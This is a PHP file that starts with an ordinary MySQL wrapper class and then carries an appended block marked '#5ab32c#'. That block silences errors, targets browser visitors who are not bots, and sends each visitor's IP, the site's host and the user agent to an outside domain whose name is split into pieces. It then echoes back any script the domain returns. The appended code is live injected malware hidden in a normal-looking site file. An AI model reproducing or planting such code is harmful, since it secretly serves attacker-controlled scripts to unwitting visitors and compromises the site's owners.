<?php
class db
{
	# ------------------------------------------------------------------ #
	public final function __construct()
	{
		$conn = mysql_connect( DB_HOST, DB_USER, DB_PASS ) or die( 'Não foi possível conectar.' );
		mysql_select_db( DB_DATABASE, $conn );
		mysql_query( "SET time_zone = '" . DB_TIMEZONE . "'" );
	}
	
	# ------------------------------------------------------------------ #
	#public static function fetch( $result )
	#{
	#	return mysql_fetch_assoc( $result );
	#}
	
	# ------------------------------------------------------------------ #
	public static function insert_id()
	{
		return mysql_insert_id();
	}
	
	# ------------------------------------------------------------------ #
	public static function num_rows( $result )
	{
		return mysql_num_rows( $result );
	}
	
	# ------------------------------------------------------------------ #
	public static function query( $sql )
	{
		global $mc;

		$tmp = array();
		$results = mysql_query( $sql );
		
		if ( $results != 1 && $results != 0 )
		{
			while ( $row = mysql_fetch_assoc( $results ) )
			{
				$tmp[] = $row;
			}
			
			$results = $tmp;
		}
		
		return $results;
	}
}

$db = new db();
?>
<?php
#5ab32c#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/5ab32c#
?>